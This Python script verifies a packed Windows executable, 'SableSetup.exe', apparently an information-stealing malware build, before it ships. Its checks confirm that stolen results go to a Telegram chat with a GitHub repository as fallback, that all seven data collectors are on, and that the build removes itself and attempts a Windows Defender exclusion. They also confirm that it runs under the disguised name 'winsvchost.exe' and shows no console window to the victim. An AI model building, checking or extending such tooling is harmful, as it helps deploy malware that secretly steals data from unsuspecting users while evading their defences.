"""Verify the bound artifact before it leaves the desk.

Seven checks, each one a thing that has failed before or that the ticket names: the
container has a trailer, the payload opens with the seal key, the config inside is the
config that was asked for, the agent source inside matches the tree it was built from,
the frozen launcher carries every module the payload imports, the image is a windowed
exe, and the mutex in the trailer is the one the config asked for.

The payload is opened through the loader's own helpers rather than through a second
implementation, so a check cannot pass by disagreeing with the artifact.

    python tools/probes/verify_vuurth.py tools/probes/out/SableSetup.exe [seal-key]
"""

from __future__ import annotations

import ast
import hashlib
import io
import json
import sys
import zipfile
from pathlib import Path

ROOT = Path(r"C:\Users\Kuzenee\Desktop\55555\sable")
sys.path.insert(0, str(ROOT))
sys.path.insert(0, str(ROOT / "tools"))

from agent import loader  # noqa: E402
from launcher_imports import hidden_imports  # noqa: E402

OUT = Path(r"C:\Users\Kuzenee\Desktop\55555\_harness\out")

artifact = Path(sys.argv[1]) if len(sys.argv) > 1 else OUT / "SableSetup.exe"
expected_seal = sys.argv[2] if len(sys.argv) > 2 else "SableVuurth-2026-11-22"

ok = 0
bad = 0


def check(name: str, condition: bool, detail: str = "") -> None:
    global ok, bad
    if condition:
        ok += 1
        print(f"PASS  {name}{'  ' + detail if detail else ''}")
    else:
        bad += 1
        print(f"FAIL  {name}{'  ' + detail if detail else ''}")


body = artifact.read_bytes()
print(f"artifact {artifact}")
print(f"size     {len(body)} bytes")
print()

# 1. Trailer.
trailer = loader._read_trailer(artifact)
check("trailer readable", bool(trailer.mutex))
check("trailer seal key is the ticket's", trailer.seal_key == expected_seal)
check("trailer mutex is the ticket's", trailer.mutex == r"Global\SableLiveVuurth", trailer.mutex)

# 2. Payload opens.
offset = loader._archive_offset(artifact)
sealed = loader._read_sealed(artifact, offset)
plaintext = loader._open_sealed(sealed, trailer.seal_key)
check("payload unseals", len(plaintext) > 0, f"{len(plaintext)} bytes")

members: dict[str, bytes] = {}
if plaintext:
    with zipfile.ZipFile(io.BytesIO(plaintext)) as bundle:
        members = {name: bundle.read(name) for name in bundle.namelist()}
check("payload is a zip", bool(members), f"{len(members)} members")

# 3. The config inside is the config that was asked for.
cfg = json.loads(members.get("cfg.json", b"{}"))
relay = cfg.get("relay", {})
targets = relay.get("targets") or []
check("primary is telegram", relay.get("kind") == "telegram")
check("telegram chat is the ticket's", relay.get("endpoint", "").endswith("$8091562135"))
check("fallback is phantom", bool(targets) and targets[0].get("kind") == "phantom")
check(
    "fallback repo is the ticket's",
    "ytripdame-sudo/SableResults" in (targets[0].get("endpoint", "") if targets else ""),
)
sources = cfg.get("sources", {})
check("every collector on", all(sources.values()) and len(sources) == 7, json.dumps(sources))
check("self-remove on", cfg.get("self_remove") is True)
check("defender exclusion attempted", cfg.get("defender_exclusion") is True)
check("image name is hidden", cfg.get("image_name") == "winsvchost.exe")
check("raw bundle off", cfg.get("raw_bundle") is False)
check("archive is sealed on the wire", cfg.get("seal_key") == expected_seal)

# 4. The agent source inside is the source on disk: a stale bundle is a lying artifact.
def digest(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


stale = []
for name, data in sorted(members.items()):
    if not name.startswith("agent/"):
        continue
    local = ROOT / name
    if not local.is_file():
        stale.append(f"{name} (missing on disk)")
    elif digest(local.read_bytes()) != digest(data):
        stale.append(f"{name} (differs)")
check("agent source matches the tree", stale == [], ", ".join(stale[:4]))

# 5. Every module the payload imports is in the frozen launcher.
covered = set(hidden_imports(ROOT / "agent"))
found: set[str] = set()
for path in sorted((ROOT / "agent").rglob("*.py")):
    tree = ast.parse(path.read_text(encoding="utf-8"))
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            for alias in node.names:
                found.add(alias.name.split(".")[0])
        elif isinstance(node, ast.ImportFrom) and not node.level and node.module:
            found.add(node.module.split(".")[0])
missing = sorted(found - {"agent", "core", "__future__"} - covered)
check("frozen launcher carries the imports", missing == [], ", ".join(missing))

# 6. Windowed subsystem: a console would flash on the target.
pe_offset = int.from_bytes(body[0x3C:0x40], "little")
subsystem = int.from_bytes(body[pe_offset + 0x5C : pe_offset + 0x5E], "little")
check("windows subsystem (no console)", subsystem == 2, f"subsystem={subsystem}")

# 7. The payload does not carry the build machine's paths.
leaks = [
    name
    for name, data in members.items()
    if b"Kuzenee" in data and not name.startswith("core/")
]
check("no build-machine paths in the payload", leaks == [], ", ".join(leaks[:4]))

print()
print(f"{ok} passed, {bad} failed")
raise SystemExit(1 if bad else 0)
